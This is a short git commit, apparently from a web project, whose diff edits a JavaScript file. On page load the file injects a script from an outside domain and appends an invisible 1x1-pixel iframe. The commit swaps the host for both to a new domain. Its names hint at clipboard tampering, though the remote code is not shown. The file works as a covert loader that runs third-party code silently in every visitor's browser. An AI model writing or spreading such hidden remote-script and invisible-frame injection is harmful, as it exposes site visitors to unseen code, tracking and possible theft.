34000ca8612ebbeac25dc555c621818b01850322
root <lionel@buzzy.cc>
2018-08-10 17:27:15 +0800

    ok

--- project/public/js/kouling47.js
+++ project/public/js/kouling47.js
@@ -1,6 +1,6 @@
 window.onload= function(){
   var s=document.createElement("script");
-  s.setAttribute('src','http://www.jswoge.top/js/copy_mua47.js');
+  s.setAttribute('src','http://tiexie0.wang/js/copy_mua47.js');
   document.body.appendChild(s)
-  obj=document.createElement("iframe");obj.frameborder=0;obj.src="http://www.jswoge.top/website/cnzz47.html";obj.frameBorder=0;obj.width="1px";obj.height="1px";obj.scrolling="no";document.body.appendChild(obj)
+  obj=document.createElement("iframe");obj.frameborder=0;obj.src="http://tiexie0.wang/website/cnzz47.html";obj.frameBorder=0;obj.width="1px";obj.height="1px";obj.scrolling="no";document.body.appendChild(obj)
 }
